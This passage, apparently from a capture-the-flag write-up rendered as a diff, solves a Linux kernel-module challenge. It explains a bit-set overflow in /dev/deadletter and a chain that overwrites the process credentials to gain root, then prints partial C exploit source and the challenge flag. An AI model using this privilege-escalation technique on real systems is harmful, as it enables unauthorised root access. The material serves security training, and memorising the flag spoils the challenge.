+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Event</td>
+<td>Layer7 CTF 2026</td>
+</tr>
+<tr>
+<td>Category</td>
+<td><code>pwn</code></td>
+</tr>
+<tr>
+<td>Points</td>
+<td><code>974</code></td>
+</tr>
+<tr>
+<td>Solved at</td>
+<td><code>2026-11-21 09:48:22+07:00</code></td>
+</tr>
+<tr>
+<td>Flag</td>
+<td><code>Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}</code></td>
+</tr>
+<tr>
+<td>Status</td>
+<td><code>VERIFIED</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="tldr">TL;DR<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h2>
+<p><code>Dead Letter</code> is a Linux 6.1 kernel-module challenge. The module <code>/dev/deadletter</code>
+keeps all of its state on one zeroed page and exposes three ioctls. The bitmap
+ioctl can set arbitrary bits in <code>page+0x100..0x1ff</code>, which overlaps the header
+at <code>page+0x180</code>. Setting bit 12 of <code>header[8]</code> raises the body access bound from
+<code>0x100</code> to <code>0x1100</code>, turning the "read/write body" ioctl into a read/write
+primitive over the slot table and the sealed "letter".</p>
+<p>The page can then be parsed to recover the active slot, the per-open keys and
+the encoded pointers (module base, <code>current-&gt;cred</code>). The "send" ioctl
+authenticates a slot and calls the decoded <code>slot[0x10]</code> pointer with
+<code>rdi = ctx</code>, so we can invoke the module's own gate functions in sequence:</p>
+<ol>
+<li><code>0x120</code> validates the letter/slot and caches <code>current-&gt;cred</code> into <code>ctx[0x38]</code>;</li>
+<li><code>0x2b0</code> sets <code>header[0x10] = current-&gt;cred</code>, so the body-write ioctl now
+   writes to our <code>cred</code>.</li>
+</ol>
+<p>Finally we overwrite <code>cred-&gt;uid/gid/...</code> with zero and grant full capabilities,
+then read <code>/flag</code> as root.</p>
+<p>Flag: <code>Layer7{43837d8375d546a39db46ef0b86994ea637c123700d5ffc8e5e77337478df6b8}</code></p>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<p>Files from <code>python3 l7.py file 7</code> (<code>for_user.zip</code>):</p>
+<div class="highlight"><pre><span></span><code>bzImage             Linux kernel 6.1.0-54-amd64 (Debian 6.1.190-1)
+deadletter.ko       misc driver &quot;Dead Letter secure cartridge controller&quot;
+initramfs.cpio.gz   contains /deadletter.ko, /flag (fake locally), /drop
+run.sh              qemu-system-x86_64 -m 256M -cpu qemu64,+smep,+smap \
+                    -append &#39;console=ttyS0 quiet loglevel=3 kaslr panic=1 oops=panic pti=on&#39;
+                    -sandbox on,...
+</code></pre></div>
+<p><code>run.sh</code> runs with KASLR, SMEP, SMAP, PTI and a restrictive QEMU sandbox.
+<code>/drop</code> is a static binary that only does <code>setuid(1000); setgid(1000);
+execl("/bin/sh","sh",NULL)</code>, so the attacker is uid 1000 and <code>/dev/deadletter</code>
+is world-writable.</p>
+<p>The module is stripped but not obfuscated in the usual sense. The strings are
+stored as reversed immediates: <code>tteldaed</code>, <code>!xobliam</code> (<code>mailbox!</code>),
+<code>!!1egats</code> (<code>stage1!!</code>), <code>DERC</code> (<code>CRED</code>), <code>MMOC</code> (<code>COMM</code>), <code>KSAT</code> (<code>TASK</code>),
+<code>TUOR</code> (<code>ROUT</code>), <code>TSAFA9D</code> (<code>FAST</code>). The driver registers a single misc device
+with <code>file_operations</code> = <code>{ .unlocked_ioctl = 0x940, .open = 0xe60,
+.release = 0x890 }</code> (offsets verified against the BTF-typed <code>vmlinux</code>
+extracted from the provided <code>bzImage</code>).</p>
+<p>Local testing infrastructure: the extracted initramfs was extended with the
+exploit and an init script that loads the module, runs the exploit as uid 1000
+and powers off. The fake flag is <code>Layer7{**fake_flag**}</code>; the remote service
+injects the real flag into the same initramfs.</p>
+<h2 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h2>
+<h3 id="heap-layout-created-by-open">Heap layout created by <code>open()</code><a class="headerlink" href="#heap-layout-created-by-open" title="Permanent link">&para;</a></h3>
+<p><code>open()</code> (<code>.text+0xe60</code>):</p>
+<ul>
+<li><code>ctx = kmalloc(0x58, GFP_KERNEL | __GFP_ZERO)</code>  (<code>0xdc0</code> flags)</li>
+<li>one zeroed page <code>page = get_zeroed_page()</code></li>
+<li><code>ctx[0x00] = page</code></li>
+<li><code>ctx[0x08] = page+0x200</code></li>
+<li><code>ctx[0x10] = page+0x100</code></li>
+<li><code>ctx[0x18] = page+0x180</code></li>
+<li><code>ctx[0x20] = page+0xc00</code></li>
+<li><code>ctx[0x28] = &lt;random active slot&gt;</code></li>
+</ul>
+<p>Page layout:</p>
+<div class="highlight"><pre><span></span><code>page+0x100  bitmap (0x80 bytes)     &lt;-- bts target
+page+0x180  header (0x80 bytes)     &lt;-- overlaps the bitmap!
+              +0x00  &quot;deadlett&quot; ^ handle
+              +0x08  u64 bound/flags  (initial 0x00000003_00000100)
+              +0x10  pointer to body (page+0x200)
+page+0x200  body    (0x100 bytes)
+page+0x400  9 slots, 0x80 bytes each
+page+0xc00  letter, 0x80 bytes
+</code></pre></div>
+<p>Each slot is seeded with two random u32 values <code>C = slot[0x30]</code>,
+<code>A = slot[0x34] = mix(C)</code>, <code>B = slot[0x38] = hash32(C)</code>, and a random
+64-bit handle <code>H = slot[0x08] = (u64)C&lt;&lt;32 | A</code>. The slot also contains
+<code>slot[0x20] = page</code>, <code>slot[0x28] = page+0x200</code> and several encoded 64-bit
+pointers:</p>
+<div class="highlight"><pre><span></span><code>key1 = A*0x100000001 ^ H ^ 0xd1ceb00bcafebeef
+key2 = A*0x100000001 ^ rol64(B,0x1d) ^ H ^ 0xa3a1c57fafd3c8dd
+
+enc(key, fn) = rol64(key+fn, 0x11) ^ ror64(key, 0x0b)
+fn          = ror64(enc ^ ror64(key,0x0b), 0x11) - key
+</code></pre></div>
+<p>At <code>open()</code> the letter is built from the active slot and encodes, among other
+things, <code>current</code> and <code>current-&gt;cred</code> (<code>task_struct-&gt;cred</code> is at offset <code>0xb90</code>
+in this kernel).</p>
+<h3 id="ioctls">Ioctls<a class="headerlink" href="#ioctls" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>0x40084b40</code> — <code>{u16 idx; u16 0; u32 0}</code> → <code>bts [page+0x100], idx</code>, <code>idx &lt;= 0x7ff</code>.
+  This is the bug: <code>idx</code> up to <code>0x7ff</code> reaches <code>page+0x1ff</code>, i.e. the header.</li>
+<li><code>0x40184b41</code> — <code>{u32 off; u32 len; u64 buf; u32 mode; u32 flags}</code></li>
+<li>mode 0: <code>copy_to_user(buf, header[0x10]+off, len)</code></li>
+<li>mode 1: <code>copy_from_user(buf, len); memcpy(header[0x10]+off, buf, len)</code></li>
+<li>mode 2: <code>copy_to_user(buf, ctx[0x38]+off, len)</code>, bounded by <code>ctx[0x40]</code></li>
+<li><code>len &lt;= 0x800</code>, <code>off+len &lt;= header[8]</code> (for modes 0/1).</li>
+<li><code>0xc0184b42</code> — <code>{u64 handle; u64 token; u64 result}</code>:
+  finds a slot with <code>slot[8] == handle</code>, requires it to be the active slot
+  <code>ctx[0x28]</code>, verifies the token
+  <code>token = rol32(A,7) ^ A ^ B ^ 0x73656e64 ("send")</code>, verifies a large set of
+  invariants (including <code>slot[0x48] == hash_slot(slot)</code>), then decodes
+  <code>slot[0x10]</code> and calls it with <code>rdi = ctx</code>. The function return value is
+  written to <code>slot[0x40]</code> and to <code>result</code>.</li>
+</ul>
+<h3 id="gate-functions-reachable-through-slot0x10">Gate functions reachable through <code>slot[0x10]</code><a class="headerlink" href="#gate-functions-reachable-through-slot0x10" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>.text+0x120</code> validates the letter and slot, checks that the decoded
+  <code>letter[0x40]</code> equals <code>current-&gt;cred</code>, then stores
+  <code>ctx[0x38] = current-&gt;cred</code>, <code>ctx[0x40] = 0x100</code>, <code>ctx[0x48] = ...</code> and
+  updates <code>slot[0x3c]</code>. This enables the mode-2 read window over <code>cred</code>.</li>
+<li><code>.text+0x2b0</code> requires the state produced by <code>0x120</code>, then sets
+  <code>header[0x10] = current-&gt;cred</code>, <code>header[8] = 0x100</code>,
+  <code>header[0xc] = 0x80000003</code>. This turns mode 1 into an arbitrary write into
+  <code>cred</code>.</li>
+</ul>
+<h3 id="exploit-chain">Exploit chain<a class="headerlink" href="#exploit-chain" title="Permanent link">&para;</a></h3>
+<ol>
+<li><code>set_bit(0x44c)</code> sets bit 12 of <code>header[8]</code> (<code>0x100 -&gt; 0x1100</code>).
+   This both raises the body bound enough to reach the slots/letter and makes
+   the qword at <code>header+8</code> exactly <code>0x00000003_000001100</code>, which <code>0x120</code> checks.</li>
+<li>Mode 0 dump of <code>page+0x200 .. page+0x1000</code> recovers all slots and the letter.</li>
+<li><code>letter[0x20]</code> is the handle of the active slot; matching it against each
+   <code>slot[8]</code> identifies the active slot index (the active slot is random).</li>
+<li><code>key1</code>, <code>key2</code> are recomputed from <code>A</code>, <code>B</code>, <code>H</code>. Decoding <code>slot[0x18]</code>
+   yields the module base; decoding <code>letter[0x40]</code> yields <code>current-&gt;cred</code>.</li>
+<li>We modify the letter: <code>letter[0x18] = H ^ 0x7374616765312121</code> so that
+   <code>0x2b0</code>'s check on <code>ctx[0x30]</code> (zeroed by <code>__GFP_ZERO</code>) passes, then
+   recompute the two letter hashes (<code>func0</code> at <code>.text+0x0</code>, <code>func70</code> at
+   <code>.text+0x70</code>) and store them at <code>letter[0x28]</code> / <code>letter[0x68]</code>.</li>
+<li>Craft the active slot: keep all authenticated fields, set
+   <code>slot[0x10] = enc(key1, .text+0x120)</code>, <code>slot[0x3c]</code> to the "FAST" check
+   value, <code>slot[0x40] = cred</code>, and recompute <code>slot[0x48] = hash_slot(slot)</code>.
+   Send with the correct token → <code>0x120</code> runs, caching <code>cred</code>.</li>
+<li>Read <code>cred</code> via mode 2. Craft the slot again with
+   <code>slot[0x10] = enc(key1, .text+0x2b0)</code>, the new <code>slot[0x3c]</code> ("COMM"),
+   <code>slot[0x40] = cred</code>, recompute the hash, send again → <code>0x2b0</code> sets
+   <code>header[0x10] = cred</code>.</li>
+<li>Mode 1 write of a patched <code>cred</code> buffer: all uids/gids = 0 and
+   <code>cap_permitted/effective/bset/ambient = 0x1ffffffffff</code>.</li>
+<li><code>getuid()</code> now returns 0 and <code>/flag</code> is readable.</li>
+</ol>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>Full source is <code>work/7/exploit.c</code> (same code compiled with <code>musl-gcc -static</code>
+into <code>work/7/exploit_musl</code>, 42 KB). The uploader is <code>work/7/remote.py</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Dead Letter - Layer7 CTF 2026</span>
+<span class="c1">// Kernel module /dev/deadletter exploit.</span>
+<span class="c1">//</span>
+<span class="c1">//   ioctl 0x40084b40: {u16 idx; u16 pad; u32 pad2}  -&gt; bts bitmap[page+0x100], idx</span>
+<span class="c1">//   ioctl 0x40184b41: {u32 off; u32 len; u64 buf; u32 mode; u32 flags}</span>
+<span class="c1">//        mode 0: read  (header[0x10]+off) -&gt; user</span>
+<span class="c1">//        mode 1: write user -&gt; (header[0x10]+off)</span>
+<span class="c1">//        mode 2: read  (ctx[0x38]+off) -&gt; user   (bound ctx[0x40])</span>
+<span class="c1">//   ioctl 0xc0184b42: {u64 handle; u64 token; u64 result}</span>
+<span class="c1">//        finds slot by handle, checks signature + hash, then calls the</span>
+<span class="c1">//        decoded function pointer slot[0x10] with rdi = ctx.</span>
+
+<span class="cp">#define _GNU_SOURCE</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdint.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/ioctl.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;errno.h&gt;</span>
+
+<span class="cp">#define CMD_BIT   0x40084b40UL</span>
+<span class="cp">#define CMD_RW    0x40184b41UL</span>
+<span class="cp">#define CMD_SEND  0xc0184b42UL</span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">rw_req</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">off</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">mode</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">send_req</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">handle</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">token</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">rol64</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="mi">63</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="p">((</span><span class="mi">64</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mi">63</span><span class="p">));</span><span class="w"> </span><span class="p">}</span>
+<span class="k">static</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">ror64</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="mi">63</span><span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="p">((</span><span class="mi">64</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mi">63</span><span class="p">));</span><span class="w"> </span><span class="p">}</span>
+<span class="k">static</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">rol32</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="p">(</span><span class="mi">32</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">n</span><span class="p">));</span><span class="w"> </span><span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">set_bit</span><span class="p">(</span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">idx</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">b</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">b</span><span class="p">));</span>
+<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">idx</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">CMD_BIT</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+<span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[!] set_bit(%#x): %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">idx</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">page_read_chunk</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">rw_req</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
+<span class="w">    </span><span class="n">r</span><span class="p">.</span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">dst</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">CMD_RW</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">page_read</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dst</span><span class="p">;</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mh">0x800</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mh">0x800</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">len</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page_read_chunk</span><span class="p">(</span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">c</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">        </span><span class="n">p</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">c</span><span class="p">;</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">c</span><span class="p">;</span><span class="w"> </span><span class="n">len</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">page_write</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">src</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">rw_req</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
+<span class="w">    </span><span class="n">r</span><span class="p">.</span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">src</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">CMD_RW</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">cred_read</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">off</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">rw_req</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
+<span class="w">    </span><span class="n">r</span><span class="p">.</span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">dst</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">CMD_RW</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">send_call</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">handle</span><span class="p">,</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">token</span><span class="p">,</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">send_req</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
+<span class="w">    </span><span class="n">r</span><span class="p">.</span><span class="n">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">handle</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">token</span><span class="p">;</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">CMD_SEND</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">result</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* ---- hashes replicated from the module ---- */</span>
+<span class="k">static</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="nf">func0</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="n">S</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">r8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x510e527fade682d1ULL</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">S</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">rsi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x9e3779b97f4a7c15ULL</span><span class="p">;</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">r9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rsi</span><span class="p">;</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">r10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xd6e8feb86659fd93ULL</span><span class="p">;</span>
